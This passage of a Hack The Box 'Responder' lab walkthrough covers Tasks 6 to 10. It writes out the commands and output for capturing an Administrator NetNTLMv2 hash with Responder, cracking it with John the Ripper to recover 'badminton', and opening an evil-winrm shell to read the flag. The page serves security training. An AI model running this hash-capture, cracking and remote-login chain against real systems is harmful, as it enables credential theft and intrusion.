</span></span></code></pre></div><p>Great, now we have a <strong>NTLMv2 hash/NTLMv2 challenge and response</strong> to play around with.</p><blockquote><p>//10.10.14.6/somefile</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What does NTLM stand for?</em></p><p>Look it up on the <strong>internet</strong>.</p><blockquote><p>new technology lan manager</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>Which flag do we use in the Responder utility to specify the network interface?</em></p><p>Since no <strong>man page</strong> is available for <em><strong>responder</strong></em> we check out it&rsquo;s <strong>help options</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>─<span class=o>[</span>htb-bluewalle@htb-otcbrtzpuj<span class=o>]</span>─<span class=o>[</span>~/workspace<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$responder</span>
</span></span><span class=line><span class=cl>responder                  responder-DHCP_Auto        responder-MultiRelay
</span></span><span class=line><span class=cl>responder-BrowserListener  responder-FindSQLSrv       responder-RunFinger
</span></span><span class=line><span class=cl>responder-DHCP             responder-Icmp-Redirect    
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-otcbrtzpuj<span class=o>]</span>─<span class=o>[</span>~/workspace<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$man</span> responder
</span></span><span class=line><span class=cl>No manual entry <span class=k>for</span> responder
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-otcbrtzpuj<span class=o>]</span>─<span class=o>[</span>~/workspace<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$responder</span> --help
</span></span><span class=line><span class=cl>                                         __
</span></span><span class=line><span class=cl>  .----.-----.-----.-----.-----.-----.--<span class=p>|</span>  <span class=p>|</span>.-----.----.
</span></span><span class=line><span class=cl>  <span class=p>|</span>   _<span class=p>|</span>  -__<span class=p>|</span>__ --<span class=p>|</span>  _  <span class=p>|</span>  _  <span class=p>|</span>     <span class=p>|</span>  _  <span class=o>||</span>  -__<span class=p>|</span>   _<span class=p>|</span>
</span></span><span class=line><span class=cl>  <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_____<span class=p>|</span>_____<span class=p>|</span>   __<span class=p>|</span>_____<span class=p>|</span>__<span class=p>|</span>__<span class=p>|</span>_____<span class=o>||</span>_____<span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>                   <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           NBT-NS, LLMNR <span class=p>&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Author: Laurent Gaffie <span class=o>(</span>laurent.gaffie@gmail.com<span class=o>)</span>
</span></span><span class=line><span class=cl>  To <span class=nb>kill</span> this script hit CTRL-C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Usage: responder -I eth0 -w -r -f
</span></span><span class=line><span class=cl>or:
</span></span><span class=line><span class=cl>responder -I eth0 -wrf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Options:
</span></span><span class=line><span class=cl>  --version             show program<span class=s1>&#39;s version number and exit
</span></span></span><span class=line><span class=cl><span class=s1>  -h, --help            show this help message and exit
</span></span></span><span class=line><span class=cl><span class=s1>  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
</span></span></span><span class=line><span class=cl><span class=s1>                        BROWSER, LLMNR requests without responding.
</span></span></span><span class=line><span class=cl><span class=s1>  -I eth0, --interface=eth0
</span></span></span><span class=line><span class=cl><span class=s1>                        Network interface to use, you can use &#39;</span>ALL<span class=s1>&#39; as a
</span></span></span><span class=line><span class=cl><span class=s1>                        wildcard for all interfaces
</span></span></span><span class=line><span class=cl><span class=s1>  -i 10.0.0.21, --ip=10.0.0.21
</span></span></span><span class=line><span class=cl><span class=s1>                        Local IP to use (only for OSX)
</span></span></span><span class=line><span class=cl><span class=s1>  -e 10.0.0.22, --externalip=10.0.0.22
</span></span></span><span class=line><span class=cl><span class=s1>                        Poison all requests with another IP address than
</span></span></span><span class=line><span class=cl><span class=s1>                        Responder&#39;</span>s one.
</span></span><span class=line><span class=cl>  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
</span></span><span class=line><span class=cl>  -r, --wredir          Enable answers <span class=k>for</span> netbios wredir suffix queries.
</span></span><span class=line><span class=cl>                        Answering to wredir will likely <span class=nb>break</span> stuff on the
</span></span><span class=line><span class=cl>                        network. Default: False
</span></span><span class=line><span class=cl>  -d, --NBTNSdomain     Enable answers <span class=k>for</span> netbios domain suffix queries.
</span></span><span class=line><span class=cl>                        Answering to domain suffixes will likely <span class=nb>break</span> stuff
</span></span><span class=line><span class=cl>                        on the network. Default: False
</span></span><span class=line><span class=cl>  -f, --fingerprint     This option allows you to fingerprint a host that
</span></span><span class=line><span class=cl>                        issued an NBT-NS or LLMNR query.
</span></span><span class=line><span class=cl>  -w, --wpad            Start the WPAD rogue proxy server. Default value is
</span></span><span class=line><span class=cl>                        False
</span></span><span class=line><span class=cl>  -u UPSTREAM_PROXY, --upstream-proxy<span class=o>=</span>UPSTREAM_PROXY
</span></span><span class=line><span class=cl>                        Upstream HTTP proxy used by the rogue WPAD Proxy <span class=k>for</span>
</span></span><span class=line><span class=cl>                        outgoing requests <span class=o>(</span>format: host:port<span class=o>)</span>
</span></span><span class=line><span class=cl>  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
</span></span><span class=line><span class=cl>                        retrieval. This may cause a login prompt. Default:
</span></span><span class=line><span class=cl>                        False
</span></span><span class=line><span class=cl>  -P, --ProxyAuth       Force NTLM <span class=o>(</span>transparently<span class=o>)</span>/Basic <span class=o>(</span>prompt<span class=o>)</span>
</span></span><span class=line><span class=cl>                        authentication <span class=k>for</span> the proxy. WPAD doesn<span class=err>&#39;</span>t need to be
</span></span><span class=line><span class=cl>                        ON. This option is highly effective when combined with
</span></span><span class=line><span class=cl>                        -r. Default: False
</span></span><span class=line><span class=cl>  --lm                  Force LM hashing downgrade <span class=k>for</span> Windows XP/2003 and
</span></span><span class=line><span class=cl>                        earlier. Default: False
</span></span><span class=line><span class=cl>  -v, --verbose         Increase verbosity.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-otcbrtzpuj<span class=o>]</span>─<span class=o>[</span>~/workspace<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We use this <strong>flag</strong> in <strong>TASK5</strong> to start our <em><strong>responder</strong></em> with.</p><blockquote><p>-I</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.</em></p><p>Again, we look it up <strong>online</strong>.</p><blockquote><p>john the ripper</p></blockquote><h2 id=task-9><strong>TASK 9</strong><a hidden class=anchor aria-hidden=true href=#task-9>#</a></h2><p><strong>Question</strong>: <em>What is the password for the administrator user?</em></p><p>To get the password belonging to the <em>administrator</em> user we will have to <strong>crack</strong> the collected <strong>NTLM hash</strong> from <strong>TASK5</strong>.</p><p>To do that, first we have to <strong>save</strong> the <strong>hash</strong> into a file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$echo</span> <span class=s2>&#34;Administrator::RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000&#34;</span> &gt; ntlm_hash
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Then we <strong>run</strong> <em><strong>john</strong></em> with the <em>rockyou</em> <strong>wordlist</strong> on our <strong>hash</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$john</span> --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt ntlm_hash 
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>netntlmv2, NTLMv2 C/R <span class=o>[</span>MD4 HMAC-MD5 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>No password hashes left to crack <span class=o>(</span>see FAQ<span class=o>)</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>If the <strong>password</strong> is <strong>found</strong> but <strong>not displayed</strong> anymore (only displayed at first run), we can <strong>check</strong> it directly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$john</span> --show ntlm_hash 
</span></span><span class=line><span class=cl>Administrator:badminton:RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><blockquote><p>badminton</p></blockquote><h2 id=task-10><strong>TASK 10</strong><a hidden class=anchor aria-hidden=true href=#task-10>#</a></h2><p><strong>Question</strong>: <em>We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</em></p><p>Since we still have the <em><strong>nmap</strong></em> results from <strong>TASK1</strong>, the answer is simple.</p><blockquote><p>5985</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><table><thead><tr><th>collected credentials in TASK9</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>Administrator</td></tr><tr><td><em>password</em></td><td style=text-align:left>badminton</td></tr></tbody></table><p>We use the <strong>credentials</strong> we obtained in <strong>TASK9</strong> to access the <strong>target</strong> via the <strong>winrm</strong> service. Once connected, our <strong>flag</strong> is located at <em>C:\Users\mike\Desktop\flag.txt</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$evil</span>-winrm -i <span class=nv>$rhost</span> -u Administrator -p badminton -P <span class=m>5985</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..<span class=se>\.</span>.<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>d-----          3/9/2022   5:35 PM                Administrator
</span></span><span class=line><span class=cl>d-----          3/9/2022   5:33 PM                mike
</span></span><span class=line><span class=cl>d-r---        10/10/2020  12:37 PM                Public
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers&gt; <span class=nb>cd</span> mike
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\m</span>ike&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\m</span>ike
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>d-----         3/10/2022   4:51 AM                Desktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\m</span>ike&gt; <span class=nb>cd</span> Desktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\m</span>ike<span class=se>\D</span>esktop&gt; ls
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\m</span>ike<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                 -------------         ------ ----
</span></span><span class=line><span class=cl>-a----         3/10/2022   4:50 AM             <span class=m>32</span> flag.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\m</span>ike<span class=se>\D</span>esktop&gt; cat flag.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\m</span>ike<span class=se>\D</span>esktop&gt; <span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Exiting with code <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/tier-1/>tier-1</a></li><li><a href=https://bluewalle.github.io/tags/winrm/>winrm</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/protocols/>protocols</a></li><li><a href=https://bluewalle.github.io/tags/xampp/>xampp</a></li><li><a href=https://bluewalle.github.io/tags/smb/>smb</a></li><li><a href=https://bluewalle.github.io/tags/responder/>responder</a></li><li><a href=https://bluewalle.github.io/tags/php/>php</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/password-cracking/>password-cracking</a></li><li><a href=https://bluewalle.github.io/tags/hash-capture/>hash-capture</a></li><li><a href=https://bluewalle.github.io/tags/remote-file-inclusion/>remote-file-inclusion</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>